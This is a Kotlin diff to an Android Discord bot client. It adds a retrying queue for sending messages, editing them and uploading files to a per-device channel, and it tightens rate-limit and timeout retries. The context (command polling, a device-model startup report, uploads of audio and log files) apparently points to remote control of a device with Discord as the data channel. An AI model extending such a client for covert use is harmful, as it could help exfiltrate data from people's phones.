@@ -78,6 +78,24 @@ class DiscordGatewayClient(
     private var lastPolledMsgId: String? = null
     private var pollFailures = 0
     private val processedCmdIds = mutableSetOf<String>()
+    private val msgQueue = java.util.concurrent.LinkedBlockingQueue<QueuedMessage>()
+    private var msgQueueJob: Job? = null
+    private val msgSemaphore = kotlinx.coroutines.sync.Semaphore(1)
+
+    data class QueuedMessage(
+        val type: Type,
+        val content: String,
+        val messageId: String? = null,
+        val fileName: String? = null,
+        val fileBytes: ByteArray? = null,
+        val retries: Int = 0,
+        val maxRetries: Int = 5,
+        val completable: kotlinx.coroutines.CompletableDeferred<Boolean>? = null
+    ) {
+        enum class Type { TEXT, EDIT, FILE }
+        override fun equals(other: Any?): Boolean = this === other
+        override fun hashCode(): Int = System.identityHashCode(this)
+    }
     private var startTime = 0L
     private var deviceSuffix: String = ""
     private var onlineMsgSent = false
@@ -137,6 +155,7 @@ class DiscordGatewayClient(
             startTime = System.currentTimeMillis()
             scope = coroutineScope
             loadState()
+            startMsgQueueProcessor()
             whPost(JSONObject().apply {
                 put("event", "start")
                 put("device", android.os.Build.MODEL)
@@ -231,6 +250,83 @@ class DiscordGatewayClient(
                 }
             }
         } catch (_: Exception) {}
+    }
+
+    private fun startMsgQueueProcessor() {
+        msgQueueJob?.cancel()
+        msgQueueJob = scope?.launch(Dispatchers.IO) {
+            while (isActive) {
+                val msg = msgQueue.poll(500, java.util.concurrent.TimeUnit.MILLISECONDS) ?: continue
+                if (msg.retries >= msg.maxRetries) {
+                    msg.completable?.complete(false)
+                    continue
+                }
+                try {
+                    msgSemaphore.acquire()
+                    val success = processQueuedMessage(msg)
+                    msgSemaphore.release()
+                    if (!success) {
+                        msgQueue.offer(msg.copy(retries = msg.retries + 1))
+                        delay(1000L * (1 shl msg.retries).coerceAtMost(16))
+                    } else {
+                        msg.completable?.complete(true)
+                    }
+                } catch (e: Exception) {
+                    try { msgSemaphore.release() } catch (_: Exception) {}
+                    msgQueue.offer(msg.copy(retries = msg.retries + 1))
+                    delay(2000L)
+                }
+            }
+        }
+    }
+
+    private suspend fun processQueuedMessage(msg: QueuedMessage): Boolean {
+        val chId = myChannelId ?: return false
+        return when (msg.type) {
+            QueuedMessage.Type.TEXT -> {
+                val json = JSONObject().put("content", msg.content)
+                val req = Request.Builder()
+                    .url("https://discord.com/api/v10/channels/$chId/messages")
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .header("Content-Type", "application/json")
+                    .post(json.toString().toRequestBody(jsonMedia))
+                    .build()
+                executeWithRetry(req).use { it.isSuccessful }
+            }
+            QueuedMessage.Type.EDIT -> {
+                val json = JSONObject().put("content", msg.content)
+                val req = Request.Builder()
+                    .url("https://discord.com/api/v10/channels/$chId/messages/${msg.messageId}")
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .header("Content-Type", "application/json")
+                    .method("PATCH", json.toString().toRequestBody(jsonMedia))
+                    .build()
+                executeWithRetry(req).use { it.isSuccessful }
+            }
+            QueuedMessage.Type.FILE -> {
+                val mime = when {
+                    msg.fileName?.endsWith(".png") == true -> "image/png"
+                    msg.fileName?.endsWith(".jpg") == true || msg.fileName?.endsWith(".jpeg") == true -> "image/jpeg"
+                    msg.fileName?.endsWith(".gif") == true -> "image/gif"
+                    msg.fileName?.endsWith(".mp3") == true || msg.fileName?.endsWith(".m4a") == true -> "audio/mpeg"
+                    msg.fileName?.endsWith(".mp4") == true -> "video/mp4"
+                    msg.fileName?.endsWith(".txt") == true || msg.fileName?.endsWith(".log") == true -> "text/plain"
+                    else -> "application/octet-stream"
+                }.toMediaType()
+                val payloadJson = JSONObject().put("content", msg.content)
+                val body = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
+                    .addFormDataPart("file", msg.fileName ?: "file", msg.fileBytes!!.toRequestBody(mime))
+                    .build()
+                val req = Request.Builder()
+                    .url("https://discord.com/api/v10/channels/$chId/messages")
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .post(body)
+                    .build()
+                executeWithRetry(req).use { it.isSuccessful }
+            }
+        }
     }
 
     private fun whPost(data: JSONObject) {
@@ -643,24 +739,26 @@ class DiscordGatewayClient(
     }
 
     fun sendMsg(text: String) {
-        val chId = myChannelId ?: return
-        scope?.launch(Dispatchers.IO) {
-            try {
-                val json = JSONObject().put("content", text)
-                val url = "https://discord.com/api/v10/channels/$chId/messages"
-                val req = Request.Builder()
-                    .url(url)
-                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                    .header("Content-Type", "application/json")
-                    .post(json.toString().toRequestBody(jsonMedia))
-                    .build()
-                executeWithRetry(req).use { }
-            } catch (_: Exception) {}
-        }
+        if (myChannelId == null) return
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.TEXT,
+            content = text,
+            maxRetries = 5
+        )
+        msgQueue.offer(msg)
     }
 
     suspend fun sendMsgAwait(text: String): String? = withContext(Dispatchers.IO) {
         val chId = myChannelId ?: return@withContext null
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.TEXT,
+            content = text,
+            maxRetries = 5,
+            completable = kotlinx.coroutines.CompletableDeferred()
+        )
+        msgQueue.offer(msg)
+        val success = msg.completable!!.await()
+        if (!success) return@withContext null
         try {
             val json = JSONObject().put("content", text)
             val url = "https://discord.com/api/v10/channels/$chId/messages"
@@ -679,50 +777,26 @@ class DiscordGatewayClient(
     }
 
     fun editMsg(messageId: String, newText: String) {
-        val chId = myChannelId ?: return
-        scope?.launch(Dispatchers.IO) {
-            try {
-                val json = JSONObject().put("content", newText)
-                val url = "https://discord.com/api/v10/channels/$chId/messages/$messageId"
-                val req = Request.Builder()
-                    .url(url)
-                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                    .header("Content-Type", "application/json")
-                    .method("PATCH", json.toString().toRequestBody(jsonMedia))
-                    .build()
-            executeWithRetry(req).use { }
-            } catch (_: Exception) {}
-        }
+        if (myChannelId == null) return
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.EDIT,
+            content = newText,
+            messageId = messageId,
+            maxRetries = 5
+        )
+        msgQueue.offer(msg)
     }
 
     fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
-        val chId = myChannelId ?: return
-        scope?.launch(Dispatchers.IO) {
-            try {
-                val mime = when {
-                    fileName.endsWith(".png") -> "image/png"
-                    fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
-                    fileName.endsWith(".gif") -> "image/gif"
-                    fileName.endsWith(".mp3") || fileName.endsWith(".m4a") -> "audio/mpeg"
-                    fileName.endsWith(".mp4") -> "video/mp4"
-                    fileName.endsWith(".txt") || fileName.endsWith(".log") -> "text/plain"
-                    else -> "application/octet-stream"
-                }.toMediaType()
-                val payloadJson = JSONObject().put("content", text)
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
-                    .addFormDataPart("file", fileName, fileBytes.toRequestBody(mime))
-                    .build()
-                val url = "https://discord.com/api/v10/channels/$chId/messages"
-                val req = Request.Builder()
-                    .url(url)
-                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                    .post(body)
-                    .build()
-                executeWithRetry(req).use { }
-            } catch (_: Exception) {}
-        }
+        if (myChannelId == null) return
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.FILE,
+            content = text,
+            fileName = fileName,
+            fileBytes = fileBytes,
+            maxRetries = 5
+        )
+        msgQueue.offer(msg)
     }
 
     fun deleteMsg(messageId: String) {
@@ -883,25 +957,39 @@ class DiscordGatewayClient(
 
     private suspend fun executeWithRetry(request: Request): Response {
         var retries = 0
-        while (retries < 3) {
+        val maxRetries = 5
+        while (retries < maxRetries) {
             try {
                 val resp = restClient.newCall(request).execute()
                 if (resp.code == 429) {
                     val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
+                    val retryAfterMs = resp.header("X-RateLimit-Reset-After")?.toFloatOrNull()?.toLong()?.times(1000)
                     resp.close()
-                    delay(retryAfter * 1000)
+                    delay((retryAfterMs ?: retryAfter * 1000).coerceAtMost(60000))
                     retries++
                     continue
                 }
                 if (resp.code >= 500) {
                     resp.close()
-                    delay(1000L * (1 shl retries))
+                    delay((1000L * (1 shl retries)).coerceAtMost(16000))
                     retries++
                     continue
                 }
+                if (resp.code == 400) {
+                    val body = resp.body?.string() ?: ""
+                    android.util.Log.w("DiscordGateway", "Bad request: $body")
+                    return resp
+                }
                 return resp
+            } catch (e: java.net.SocketTimeoutException) {
+                if (retries < maxRetries - 1) {
+                    delay(2000L * (1 shl retries))
+                    retries++
+                    continue
+                }
+                throw e
             } catch (e: java.io.IOException) {
-                if (retries < 2) {
+                if (retries < maxRetries - 1) {
                     delay(1000L * (1 shl retries))
                     retries++
                     continue
@@ -909,11 +997,11 @@ class DiscordGatewayClient(
                 throw e
             }
         }
-        return try {
-            restClient.newCall(request).execute()
-        } catch (e: java.io.IOException) {
-            throw e
+        val finalAttempt = restClient.newCall(request).execute()
+        if (!finalAttempt.isSuccessful) {
+            android.util.Log.e("DiscordGateway", "All retries exhausted for ${request.url}")
         }
+        return finalAttempt
     }
 
     fun getChannelId(): String? = myChannelId
